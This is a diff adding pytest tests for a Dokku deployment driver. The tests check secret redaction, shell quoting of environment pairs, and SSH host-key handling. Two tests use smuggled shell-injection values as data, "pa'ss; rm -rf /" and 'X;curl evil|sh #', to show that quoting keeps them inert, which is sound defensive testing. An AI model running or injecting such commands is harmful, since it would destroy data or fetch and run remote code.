@@ -9,15 +9,26 @@
 # asserts it never reached a log record, an exception, or a DTO.
 #
 # Created 2026-07-21 (feat/ship-1-engine-contract): new module.
+# Updated 2026-07-21 (review fixes): direct redact() unit tests (URL password
+#   containing '@', shlex-quoted value with single quotes); whole-pair env
+#   quoting tests (hostile value through the driver, hostile key through
+#   _env_pairs); AsyncSSHTransport known_hosts kwarg tests; unparseable
+#   ps:report -> CommandFailed test.
 
 from __future__ import annotations
 
 import importlib
 import logging
+import shlex
 
 import pytest
-from pocketpaw_ee.ship_engine import CommandFailed, VerbNotSupported
-from pocketpaw_ee.ship_engine.dokku import DokkuDriver
+from pocketpaw_ee.ship_engine import AppSpec, CommandFailed, DeployRequest, VerbNotSupported
+from pocketpaw_ee.ship_engine.dokku import (
+    AsyncSSHTransport,
+    DokkuDriver,
+    _env_pairs,
+    redact,
+)
 from pocketpaw_ee.ship_engine.transcripts import FakeSSHTransport, load_transcript
 
 from tests.ship_engine import contract as c
@@ -134,6 +145,55 @@ async def test_command_failed_redacts_the_stderr_tail() -> None:
     assert SECRET_MARKERS[2] not in str(exc)
 
 
+def test_redact_url_password_containing_at() -> None:
+    # Userinfo is matched to the LAST '@' before the host, so a password
+    # containing '@' is scrubbed whole (no partial tail like 'ss@rd' left).
+    out = redact("connecting to mongodb://demo:p@ssw@rd@dokku-mongo:27017/db now")
+    assert out == "connecting to mongodb://[redacted]@dokku-mongo:27017/db now"
+
+
+def test_redact_shlex_quoted_value_with_single_quotes() -> None:
+    # shlex.quote splits a value containing quotes into multiple quoted
+    # segments ('API_KEY=pa'"'"'ss word') — the whole run must be consumed,
+    # not just the first segment.
+    secret = "pa'ss word"
+    out = redact(f"dokku config:set --no-restart demo {shlex.quote(f'API_KEY={secret}')}")
+    assert "[redacted]" in out
+    assert "pa" not in out.replace("[redacted]", "")
+    assert "ss word" not in out
+
+
+# --------------------------------------------------------------------- #
+# Env pair quoting — belt (whole-pair quote) and suspenders (DTO validation)
+# --------------------------------------------------------------------- #
+
+
+async def test_hostile_env_value_reaches_transport_quoted() -> None:
+    value = "pa'ss; rm -rf /"
+    request = DeployRequest(app=AppSpec(name=c.APP, env={"NASTY": value}), image=c.IMAGE)
+    expected_cmd = f"dokku config:set --no-restart {c.APP} " + shlex.quote(f"NASTY={value}")
+    replies = {
+        **HAPPY_REPLIES,
+        f"dokku apps:exists {c.APP}": "apps_exists_ok.txt",
+        expected_cmd: "config_set.txt",
+    }
+    transport = FakeSSHTransport(replies)
+    await DokkuDriver(transport).deploy_app(request)
+    # The fake rejects unmapped commands, so reaching this assert proves the
+    # driver sent EXACTLY the safely quoted form — nothing unquoted leaked.
+    assert expected_cmd in transport.calls
+
+
+def test_env_pairs_quote_the_key_too() -> None:
+    # Defense-in-depth: even if a hostile key ever got past the DTO boundary,
+    # whole-pair quoting keeps it one inert argv token — identical argv for
+    # dokku, no shell syntax executed.
+    hostile_key = "X;curl evil|sh #"
+    [pair] = _env_pairs({hostile_key: "v"})
+    assert pair == shlex.quote(f"{hostile_key}=v")
+    assert shlex.split(pair) == [f"{hostile_key}=v"]  # one token, verbatim
+
+
 # --------------------------------------------------------------------- #
 # Chokepoint mechanics
 # --------------------------------------------------------------------- #
@@ -151,6 +211,50 @@ async def test_timeout_maps_to_command_failed() -> None:
 async def test_fake_transport_rejects_unmapped_commands() -> None:
     with pytest.raises(AssertionError, match="no transcript"):
         await FakeSSHTransport({}).run("dokku apps:list")
+
+
+async def test_metrics_unparseable_ps_report_maps_to_command_failed() -> None:
+    replies = {**HAPPY_REPLIES, f"dokku ps:report {c.APP}": "ps_report_bad.txt"}
+    with pytest.raises(CommandFailed) as exc_info:
+        await DokkuDriver(FakeSSHTransport(replies)).metrics(c.APP)
+    # The raw unparseable value is named in the error — not a bare ValueError.
+    assert "banana" in str(exc_info.value)
+
+
+# --------------------------------------------------------------------- #
+# AsyncSSHTransport host-key posture
+# --------------------------------------------------------------------- #
+
+
+async def _capture_connect_kwargs(
+    monkeypatch: pytest.MonkeyPatch, transport: AsyncSSHTransport
+) -> dict:
+    import asyncssh
+
+    captured: dict = {}
+
+    async def fake_connect(host: str, **kwargs: object) -> object:
+        captured["host"] = host
+        captured.update(kwargs)
+        return object()  # never used as a connection in these tests
+
+    monkeypatch.setattr(asyncssh, "connect", fake_connect)
+    await transport._connect()
+    return captured
+
+
+async def test_connect_omits_known_hosts_when_unset(monkeypatch: pytest.MonkeyPatch) -> None:
+    # Passing known_hosts=None would DISABLE asyncssh's host-key verification;
+    # leaving the kwarg out keeps asyncssh's verify-by-default behavior.
+    captured = await _capture_connect_kwargs(monkeypatch, AsyncSSHTransport("box.example"))
+    assert "known_hosts" not in captured
+    assert captured["host"] == "box.example"
+
+
+async def test_connect_passes_known_hosts_when_set(monkeypatch: pytest.MonkeyPatch) -> None:
+    transport = AsyncSSHTransport("box.example", known_hosts="/etc/paw/known_hosts")
+    captured = await _capture_connect_kwargs(monkeypatch, transport)
+    assert captured["known_hosts"] == "/etc/paw/known_hosts"
 
 
 def test_asyncssh_dependency_is_installed() -> None:
